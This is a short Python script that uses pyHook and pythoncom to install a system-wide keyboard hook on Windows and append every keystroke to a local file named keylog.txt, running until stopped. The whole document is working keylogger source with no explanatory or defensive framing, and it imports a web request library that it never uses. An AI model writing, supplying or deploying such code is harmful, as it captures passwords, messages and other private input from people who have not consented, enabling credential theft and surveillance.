import pyHook, pythoncom
import sys
import urllib.request as req

def OnKeyboardEvent(event):
	try:
		f = open('keylog.txt', 'a')
		f.write(chr(event.Ascii))
	finally:
		f.close()
	
	return True


	
hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()
